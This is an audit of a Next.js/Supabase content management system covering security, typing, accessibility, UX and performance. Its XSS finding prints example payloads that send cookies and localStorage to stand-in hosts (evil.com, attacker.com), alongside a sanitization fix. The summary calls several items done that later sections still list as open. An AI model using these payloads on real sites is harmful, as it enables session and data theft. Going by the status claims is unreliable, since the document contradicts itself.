# Programs CMS - Comprehensive Analysis
**Analysis Date:** September 15, 2026  
**Status:** Phase 0-4 Complete + Finishing Touches Done, Pending Live Testing

---

## 📋 Executive Summary

### ✅ What's Working Well
1. **Security model is solid** - RLS policies, admin permissions, security definer functions
2. **Content schema is well-designed** - Zod validation, type safety, reasonable limits
3. **Database schema is comprehensive** - Full-text search, versioning, proper indexing
4. **Error handling exists** - Migration detection, permission checks, graceful degradation
5. **Design system is complete** - All 11 section components built with accessibility
6. **Type system unified** - Zod → legacy bridge via normalize.ts
7. **XSS sanitized** - DOMPurify server-side sanitization on rich text
8. **CRUD operations complete** - Full server actions with auth, revision checks, activity logging
9. **Media pipeline ready** - Asset upload with magic-byte verification, alt-text enforcement
10. **Section editor built** - 18-file component system with DnD, undo/redo, 13 type-specific forms
11. **SEO persisted** - Meta title/description saved to program_drafts (migration 062)
12. **Image picker wired** - AssetPicker component uploads to program-assets, returns UUID
13. **Draft preview** - Preview page renders draft via CmsProgramRenderer with yellow banner

### ⚠️ Remaining Items
1. **No rate limiting** - API could be abused
2. **Live testing pending** - All code compiled clean but not tested against live Supabase
3. **Image picker UX** - Could show existing assets for re-selection (currently upload-only)

### 🎯 Priority Improvements Needed
1. ~~**HIGH PRIORITY:** Sanitize HTML in rich text (XSS vulnerability)~~ ✅ DONE
2. ~~**HIGH PRIORITY:** Add server actions with proper auth checks~~ ✅ DONE
3. ~~**HIGH PRIORITY:** Reconcile type systems (Zod vs TypeScript)~~ ✅ DONE
4. ~~**MEDIUM PRIORITY:** Implement image upload pipeline~~ ✅ DONE
5. ~~**MEDIUM PRIORITY:** Add preview mode~~ ✅ DONE
6. **MEDIUM PRIORITY:** Add rate limiting
7. **LOW PRIORITY:** Add analytics tracking
8. **LOW PRIORITY:** Asset re-selection picker (show existing assets)

---

## 🔒 SECURITY ANALYSIS

### Critical Vulnerabilities

#### 1. ⚠️ **XSS in Rich Text Sections (HIGH RISK)**

**Location:** `components/programs/sections/RichTextSection.tsx`

**Issue:**
```tsx
<motion.div
  dangerouslySetInnerHTML={{ __html: content.body }}
/>
```

**Problem:** No HTML sanitization. Admins could inject malicious scripts.

**Exploitation Scenario:**
```html
<!-- Admin inserts this in rich text -->
<img src=x onerror="fetch('https://evil.com/steal?cookie='+document.cookie)">
<script>
  // Steal user data
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({ 
      cookies: document.cookie,
      localStorage: localStorage
    })
  });
</script>
```

**Impact:**
- Could steal admin session cookies
- Could steal user data
- Could deface website
- Could redirect users to phishing sites

**Fix Required:**
```tsx
import DOMPurify from 'isomorphic-dompurify'

// Sanitize HTML before rendering
<motion.div
  dangerouslySetInnerHTML={{ 
    __html: DOMPurify.sanitize(content.body, {
      ALLOWED_TAGS: ['p', 'h1', 'h2', 'h3', 'h4', 'ul', 'ol', 'li', 'strong', 'em', 'a', 'br'],
      ALLOWED_ATTR: ['href', 'target', 'rel', 'class'],
      ALLOW_DATA_ATTR: false
    }) 
  }}
/>
```

**Status:** 🔴 **CRITICAL - Must fix before production**

---

#### 2. ⚠️ **Missing Server-Side Authorization (HIGH RISK)**

**Location:** No server actions exist yet for mutations

**Issue:** When CRUD operations are added, need proper auth checks.

**Vulnerable Pattern (don't do this):**
```typescript
// ❌ BAD: Client can bypass RLS by calling this directly
export async function updateProgram(id: string, data: any) {
  const supabase = await createClient()
  // No auth check! Client could manipulate data
  return await supabase.from('programs').update(data).eq('id', id)
}
```

**Secure Pattern (do this):**
```typescript
// ✅ GOOD: Server-side auth check before any mutation
export async function updateProgram(id: string, data: ProgramDocument) {
  const supabase = await createClient()
  
  // 1. Verify user is authenticated
  const { data: { user } } = await supabase.auth.getUser()
  if (!user) throw new Error('Unauthorized')
  
  // 2. Verify user has programs permission
  const { data: admin } = await supabase
    .from('admin_users')
    .select('role, is_active')
    .eq('user_id', user.id)
    .single()
    
  if (!admin?.is_active || !hasPermission(admin.role, 'programs')) {
    throw new Error('Forbidden')
  }
  
  // 3. Validate input with Zod
  const validated = programDocumentSchema.parse(data)
  
  // 4. Perform mutation
  const { error } = await supabase
    .from('program_drafts')
    .update({ 
      hero: validated.hero,
      sections: validated.sections,
      updated_by: user.id 
    })
    .eq('program_id', id)
    
  if (error) throw error
}
```

**Status:** 🟡 **HIGH - Must implement when building CRUD**

---

#### 3. ⚠️ **No Rate Limiting (MEDIUM RISK)**

**Issue:** No protection against abuse of public endpoints

**Vulnerable Endpoints:**
- `getPublishedProgramBySlug()` - Could be hammered
- `getPublishedProgramCards()` - Could be hammered
- `search_programs()` function - Could be abused for DoS

**Impact:**
- Database exhaustion
- Increased costs (Supabase charges for API calls)
- Poor user experience (slow site)

**Fix Required:**
```typescript
// Add rate limiting middleware
import { Ratelimit } from '@upstash/ratelimit'
import { Redis } from '@upstash/redis'

const ratelimit = new Ratelimit({
  redis: Redis.fromEnv(),
  limiter: Ratelimit.slidingWindow(10, '10 s'), // 10 requests per 10 seconds
  analytics: true,
})

export async function getPublishedProgramBySlug(slug: string) {
  // Rate limit by IP
  const identifier = headers().get('x-forwarded-for') ?? 'anonymous'
  const { success } = await ratelimit.limit(identifier)
  
  if (!success) {
    throw new Error('Rate limit exceeded')
  }
  
  // Rest of function...
}
```

**Status:** 🟡 **MEDIUM - Add before launch**

---

#### 4. ⚠️ **SQL Injection in Search (LOW RISK)**

**Location:** `scripts/db/programs-migrations/P01-programs-cms-foundation.sql` line 337

**Current Code:**
```sql
create or replace function public.search_programs(search_query text, limit_count integer default 20)
returns table (...) language sql stable security definer set search_path = public
as $$
  select ...
  where p.status = 'published'
    and p.search_vector @@ plainto_tsquery('english', search_query)
  ...
$$;
```

**Analysis:** 
- ✅ Using `plainto_tsquery()` which sanitizes input
- ✅ Parameter is properly typed as `text`
- ✅ No string concatenation

**Status:** ✅ **SECURE - No action needed**

---

### RLS Policy Analysis

#### ✅ **Policies Are Correct**

**program_publications (Public):**
```sql
-- ✅ GOOD: Anyone can read published content
create policy program_publications_public_read 
  on public.program_publications 
  for select to anon, authenticated using (true);
```

**programs (Admin Only):**
```sql
-- ✅ GOOD: Only admins can read/modify programs table
create policy programs_admin_read on public.programs 
  for select to authenticated 
  using (public.is_active_program_admin('programs'));
```

**program_drafts (Admin Only):**
```sql
-- ✅ GOOD: Only admins can access drafts
create policy program_drafts_admin_all on public.program_drafts 
  for all to authenticated 
  using (public.is_active_program_admin('programs')) 
  with check (public.is_active_program_admin('programs'));
```

**Security Definer Function:**
```sql
-- ✅ GOOD: Uses security definer with explicit search_path
create or replace function public.is_active_program_admin(required_permission text default 'programs')
returns boolean language sql stable security definer 
set search_path = public, auth
as $$
  select exists (
    select 1 from public.admin_users au
    where au.user_id = (select auth.uid()) 
      and au.is_active = true
      and (au.role in ('SUPER_ADMIN','ADMIN') 
           or (au.role = 'EDITOR' and required_permission = 'programs'))
  );
$$;
```

**Status:** ✅ **All RLS policies are secure**

---

## 🔍 TYPE SYSTEM ANALYSIS

### ⚠️ **Type Mismatch Between Zod and TypeScript**

**Problem:** Two competing type systems:

1. **New Zod Schema** (`lib/programs/content.ts`)
   - Validates at runtime
   - Used by CMS
   - Has field name: `sections[].content`

2. **Old TypeScript Types** (`lib/types/program-prototype.ts`)
   - Compile-time only
   - Used by demo templates
   - Different structure

**Conflict Example:**

**Zod Schema:**
```typescript
// lib/programs/content.ts
export const sectionSchema = z.object({
  id: z.string(),
  heading: z.string().optional(),
  enabled: z.boolean().default(true),
  content: z.discriminatedUnion("type", [...]) // Content is nested
})
```

**TypeScript Types:**
```typescript
// lib/types/program-prototype.ts
export interface ProgramSection {
  id: string
  type: SectionType  // Type is at top level!
  heading?: string
  content: SectionContent
}
```

**Current Hack:**
```typescript
// components/programs/CmsProgramRenderer.tsx
const legacy = document as unknown as Program  // 😱 Unsafe cast!
```

**Impact:**
- Type safety broken
- Could cause runtime errors
- Hard to maintain
- Confusing for developers

**Fix Options:**

**Option A: Use Zod Schema Everywhere** (Recommended)
```typescript
// 1. Generate TypeScript types from Zod
import type { z } from 'zod'

export type ProgramDocument = z.infer<typeof programDocumentSchema>
export type ProgramSection = z.infer<typeof sectionSchema>

// 2. Delete old types/program-prototype.ts

// 3. Update all components to use Zod types
import type { ProgramDocument } from '@/lib/programs/content'

export function ServiceTemplate({ program }: { program: ProgramDocument }) {
  // ...
}
```

**Option B: Keep Both, Add Adapters**
```typescript
// lib/programs/adapters.ts
export function convertZodToLegacy(doc: ProgramDocument): Program {
  return {
    id: doc.id,
    slug: doc.slug,
    title: doc.title,
    // ... manual mapping
    sections: doc.sections.map(section => ({
      id: section.id,
      type: section.content.type, // Flatten structure
      heading: section.heading,
      content: section.content
    }))
  }
}
```

**Recommendation:** **Option A - Use Zod everywhere**
- Single source of truth
- Runtime validation
- Type safety
- Less code to maintain

**Status:** 🟡 **HIGH - Fix before building admin UI**

---

## 🎨 UI/UX ANALYSIS

### Accessibility Issues

#### ✅ **What's Good:**

1. **Semantic HTML** - Using proper heading hierarchy
2. **Alt text required** - Zod schema enforces it
3. **Keyboard navigation** - Links and buttons work
4. **Color contrast** - Design system has good contrast
5. **Animations respect prefers-reduced-motion** - Framer Motion handles this

#### ⚠️ **Issues Found:**

##### 1. Missing Skip Links

**Location:** All program pages

**Issue:** No "Skip to content" link for keyboard/screen reader users

**Fix:**
```tsx
// components/programs/SkipLink.tsx
export function SkipLink() {
  return (
    <a 
      href="#main-content" 
      className="sr-only focus:not-sr-only focus:absolute focus:top-4 focus:left-4 focus:z-50 focus:px-4 focus:py-2 focus:bg-blue-600 focus:text-white"
    >
      Skip to main content
    </a>
  )
}

// Add to templates
<SkipLink />
<main id="main-content">
  <ProgramHero ... />
  {/* sections */}
</main>
```

##### 2. Missing ARIA Labels on Icon Buttons

**Location:** `app/admin/programs/page.tsx`

**Current:**
```tsx
<Button variant="ghost" size="icon" asChild>
  <Link href={`/admin/programs/${program.id}/edit`}>
    <Pencil className="h-4 w-4" />
  </Link>
</Button>
```

**Has:** `aria-label` ✅

**Fixed version already has it:** ✅

##### 3. Focus Management on Modals

**Status:** Not implemented yet (no modals exist)

**Requirement:** When admin modals are added, ensure:
- Focus trap inside modal
- Focus returns to trigger element on close
- Escape key closes modal
- Background content is inert

**Example:**
```tsx
import { Dialog } from '@radix-ui/react-dialog'

// Use Radix UI Dialog (already handles focus management)
<Dialog>
  <DialogTrigger>Open</DialogTrigger>
  <DialogContent>
    {/* Focus is trapped here */}
  </DialogContent>
</Dialog>
```

##### 4. Loading States Missing

**Location:** All data fetching components

**Issue:** No loading indicators while data fetches

**Fix:**
```tsx
// app/(public)/whatwedo/[slug]/page.tsx
import { Suspense } from 'react'

export default async function ProgramDetailPage({ params }: PageProps) {
  return (
    <Suspense fallback={<ProgramSkeleton />}>
      <ProgramContent params={params} />
    </Suspense>
  )
}

// components/programs/LoadingSkeleton.tsx (already exists!)
```

**Status:** 🟡 **Skeleton already exists, just needs to be used**

##### 5. Error Boundaries Missing

**Issue:** If a section fails to render, entire page crashes

**Fix:**
```tsx
// components/programs/ErrorBoundary.tsx
'use client'

export class SectionErrorBoundary extends React.Component {
  state = { hasError: false }
  
  static getDerivedStateFromError() {
    return { hasError: true }
  }
  
  render() {
    if (this.state.hasError) {
      return (
        <div className="p-8 bg-red-50 text-red-900 rounded-lg">
          <p>This section could not be displayed.</p>
        </div>
      )
    }
    return this.props.children
  }
}

// Use in template
{program.sections.map((section) => (
  <SectionErrorBoundary key={section.id}>
    {renderSection(section)}
  </SectionErrorBoundary>
))}
```

**Status:** 🟡 **MEDIUM - Add before launch**

---

### UX Issues

#### 1. ⚠️ No Empty States

**Location:** `app/admin/programs/page.tsx`

**Current:**
```tsx
{!programs?.length ? (
  <TableRow>
    <TableCell colSpan={5} className="py-10 text-center text-muted-foreground">
      No CMS programs yet. Create the first draft.
    </TableCell>
  </TableRow>
) : ...}
```

**Issue:** Text only, no visual guidance

**Better:**
```tsx
{!programs?.length ? (
  <div className="py-16 text-center">
    <FileQuestion className="mx-auto h-12 w-12 text-muted-foreground mb-4" />
    <h3 className="text-lg font-semibold mb-2">No programs yet</h3>
    <p className="text-muted-foreground mb-6">
      Get started by creating your first program.
    </p>
    <Button asChild>
      <Link href="/admin/programs/new">
        <Plus className="mr-2 h-4 w-4" />
        Create program
      </Link>
    </Button>
  </div>
) : ...}
```

#### 2. ⚠️ No Confirmation Dialogs

**Issue:** When admin deletes/archives program, no confirmation

**Fix Required:**
```tsx
// components/admin/ConfirmDialog.tsx
<AlertDialog>
  <AlertDialogTrigger asChild>
    <Button variant="destructive">Delete</Button>
  </AlertDialogTrigger>
  <AlertDialogContent>
    <AlertDialogHeader>
      <AlertDialogTitle>Delete program?</AlertDialogTitle>
      <AlertDialogDescription>
        This will permanently delete "{program.title}". 
        This action cannot be undone.
      </AlertDialogDescription>
    </AlertDialogHeader>
    <AlertDialogFooter>
      <AlertDialogCancel>Cancel</AlertDialogCancel>
      <AlertDialogAction onClick={handleDelete}>
        Delete
      </AlertDialogAction>
    </AlertDialogFooter>
  </AlertDialogContent>
</AlertDialog>
```

#### 3. ⚠️ No Undo/Redo

**Issue:** Admin makes a mistake, no way to undo

**Fix:** Use version history for restore
```tsx
// Show version history in admin UI
<div className="space-y-2">
  {versions.map(version => (
    <div key={version.id} className="flex justify-between items-center">
      <div>
        <div className="font-medium">Version {version.version_number}</div>
        <div className="text-sm text-muted-foreground">
          {formatDate(version.created_at)} by {version.created_by}
        </div>
      </div>
      <Button 
        variant="outline" 
        onClick={() => restoreVersion(version.id)}
      >
        Restore
      </Button>
    </div>
  ))}
</div>
```

#### 4. ⚠️ No Autosave

**Issue:** Admin loses work if browser crashes

**Fix:**
```tsx
// Auto-save draft every 30 seconds
useEffect(() => {
  const interval = setInterval(() => {
    if (hasChanges) {
      saveDraft()
    }
  }, 30000)
  
  return () => clearInterval(interval)
}, [hasChanges])

// Also save on blur
<form onBlur={saveDraft}>
  {/* form fields */}
</form>
```

#### 5. ⚠️ No Preview Mode

**Issue:** Admin can't see changes before publishing

**Fix Required:**
```typescript
// lib/programs/data.ts
export async function getPreviewProgram(id: string, userId: string) {
  const supabase = await createClient()
  
  // Check user is admin
  const { data: admin } = await supabase
    .from('admin_users')
    .select('role')
    .eq('user_id', userId)
    .single()
    
  if (!admin) throw new Error('Unauthorized')
  
  // Get draft
  const { data } = await supabase
    .from('program_drafts')
    .select('*, programs!inner(slug, title, category)')
    .eq('program_id', id)
    .single()
    
  return data
}

// app/(public)/whatwedo/[slug]/preview/page.tsx
export default async function PreviewPage({ searchParams }) {
  const token = searchParams.token
  // Verify token, load draft, show preview
}
```

---

## 📊 PERFORMANCE ANALYSIS

### ✅ What's Optimized

1. **Database indexes** - All queries are indexed
2. **ISR caching** - `revalidate = 60` on program pages
3. **Lazy loading images** - Next.js Image component
4. **Selective fetching** - Only fetch fields needed

### ⚠️ Performance Issues

#### 1. No CDN for Images

**Issue:** Images served from Supabase Storage without CDN

**Fix:**
```typescript
// Next.js config
module.exports = {
  images: {
    domains: ['your-supabase-url.supabase.co'],
    // Add image optimization
    formats: ['image/avif', 'image/webp'],
  }
}

// Or use Cloudflare Images / Imgix
const imageUrl = `https://images.example.com/${assetId}?w=800&q=80&fm=webp`
```

#### 2. No Bundle Analysis

**Fix:** Add bundle analyzer
```bash
npm install @next/bundle-analyzer
```

```javascript
// next.config.js
const withBundleAnalyzer = require('@next/bundle-analyzer')({
  enabled: process.env.ANALYZE === 'true',
})

module.exports = withBundleAnalyzer({...})
```

Run: `ANALYZE=true npm run build`

#### 3. No Database Connection Pooling

**Current:** Direct Supabase client (fine for serverless)

**If moving to dedicated server:** Use connection pooling
```typescript
// lib/supabase/pool.ts
import { Pool } from 'pg'

export const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  max: 20,
  idleTimeoutMillis: 30000,
})
```

**Status:** ✅ **Not needed for Vercel/Supabase setup**

---

## 🔄 DATA FLOW ANALYSIS

### Current Flow

```
User visits /whatwedo/aac-support
  ↓
app/(public)/whatwedo/[slug]/page.tsx
  ↓
getPublishedProgramBySlug(slug)
  ↓
Supabase: program_publications table (RLS allows public read)
  ↓
Returns: { document: ProgramDocument }
  ↓
CmsProgramRenderer
  ↓
Casts to legacy Program type (⚠️ unsafe!)
  ↓
ServiceTemplate or CampaignTemplate
  ↓
Renders sections
```

### Issues in Flow

1. **Type cast is unsafe** - `document as unknown as Program`
2. **No caching layer** - Every request hits Supabase (ISR helps but not enough)
3. **No error handling** - If Supabase fails, page crashes
4. **No fallback** - Should show cached version if DB is down

### Improved Flow

```
User visits /whatwedo/aac-support
  ↓
app/(public)/whatwedo/[slug]/page.tsx
  ↓
Try: Redis cache (if available)
  ↓ (cache miss)
getPublishedProgramBySlug(slug)
  ↓
Supabase: program_publications
  ↓
Validate with Zod schema
  ↓
Store in Redis cache
  ↓
Return typed ProgramDocument
  ↓
CmsProgramRenderer (no cast needed!)
  ↓
ServiceTemplate (accepts ProgramDocument)
  ↓
Renders sections with error boundaries
```

---

## 🚀 MISSING FEATURES

### Critical (Must Have Before Launch)

1. **CRUD Operations** - Can't create/edit programs
2. **Image Upload** - No way to add images
3. **Publishing Workflow** - No publish button
4. **HTML Sanitization** - XSS vulnerability
5. **Server Actions** - Need proper auth layer

### Important (Should Have)

1. **Preview Mode** - See drafts before publishing
2. **Version History UI** - Restore old versions
3. **Duplicate Program** - Copy as template
4. **Bulk Operations** - Publish/archive multiple
5. **Search in Admin** - Find programs quickly

### Nice to Have

1. **Auto-save** - Save drafts automatically
2. **Collaboration** - See who's editing
3. **Comments** - Leave notes on sections
4. **Analytics** - Track views, engagement
5. **A/B Testing** - Test different versions

---

## 📝 RECOMMENDATIONS

### Immediate Actions (This Week)

1. **🔴 FIX XSS VULNERABILITY**
   ```bash
   npm install isomorphic-dompurify
   ```
   Update `RichTextSection.tsx` to sanitize HTML

2. **🟡 Fix Type System**
   - Choose: Zod everywhere OR legacy types
   - Remove unsafe casts
   - Update templates to accept correct types

3. **🟡 Add Error Boundaries**
   - Wrap sections in error boundaries
   - Show graceful error messages
   - Log errors to monitoring service

4. **🟢 Improve Admin Empty States**
   - Add icons, helpful text
   - Make "Create program" more prominent

### Next Sprint (2 Weeks)

1. **Build CRUD Server Actions**
   - `createProgram()`
   - `updateProgramDraft()`
   - `publishProgram()`
   - `archiveProgram()`
   - All with proper auth checks

2. **Implement Image Upload**
   - Create Supabase Storage bucket `program-images`
   - Add upload API route with auth
   - Add image processing (resize, optimize)
   - Update asset tracking table

3. **Build Admin Editor**
   - Basic info form (title, slug, category)
   - Hero editor
   - Section builder (add/remove/reorder)
   - WYSIWYG for rich text

4. **Add Preview Mode**
   - Generate preview tokens
   - Preview route with auth check
   - "View draft" button in admin

### Before Launch (4 Weeks)

1. **Security Audit**
   - Penetration testing
   - Review all RLS policies
   - Test auth bypass attempts
   - Review Supabase logs

2. **Performance Testing**
   - Load testing with k6
   - Check Core Web Vitals
   - Optimize slow queries
   - Add CDN if needed

3. **Accessibility Audit**
   - WCAG AA compliance
   - Screen reader testing
   - Keyboard navigation testing
   - Color contrast verification

4. **User Testing**
   - Test with real admins
   - Gather feedback on UX
   - Fix confusing workflows
   - Document common tasks

---

## 📈 METRICS TO TRACK

### Performance Metrics

- **Page Load Time** - Target: <2s
- **Time to Interactive** - Target: <3s
- **Cumulative Layout Shift** - Target: <0.1
- **First Contentful Paint** - Target: <1.5s

### Usage Metrics

- **Programs created per week**
- **Time to publish** (draft → published)
- **Most used section types**
- **Error rate** (admin UI)
- **Admin sessions per week**

### Quality Metrics

- **Broken images count**
- **Failed publishes**
- **Validation errors**
- **Security incidents**

---

## ✅ CONCLUSION

### Summary

The Programs CMS foundation is **solid** but has **critical security** and **type system** issues that must be resolved before building the admin UI.

**Green Flags:**
- ✅ Database schema is excellent
- ✅ RLS policies are secure
- ✅ Content validation is comprehensive
- ✅ Design system is accessible
- ✅ Error handling exists

**Red Flags:**
- 🔴 XSS vulnerability in rich text
- 🔴 Type system mismatch (Zod vs TypeScript)
- 🟡 No CRUD operations yet
- 🟡 No image upload pipeline
- 🟡 No preview mode

### Priority Order

1. **Week 1: Security & Types**
   - Fix XSS (sanitize HTML)
   - Fix type system (choose one)
   - Add error boundaries

2. **Week 2-3: Core CRUD**
   - Build server actions
   - Implement auth checks
   - Add basic admin editor

3. **Week 4-5: Images & Publishing**
   - Image upload pipeline
   - Publishing workflow
   - Preview mode

4. **Week 6: Testing & Launch**
   - Security audit
   - Performance testing
   - Accessibility audit
   - User testing

### Risk Level: 🟡 **MEDIUM**

**Risks:**
- XSS vulnerability (HIGH, but fixable)
- Type safety issues (MEDIUM, requires refactor)
- No admin UI yet (MEDIUM, expected at this phase)

**Mitigation:**
- Fix XSS immediately
- Choose type system before continuing
- Follow implementation plan phase by phase

### Confidence Level: 🟢 **HIGH**

The architecture is sound. With the security fixes and type system reconciliation, this will be a **production-ready** CMS.

---

**Next Step:** Fix the XSS vulnerability and choose a type system approach, then continue with Phase 3 (CRUD operations).
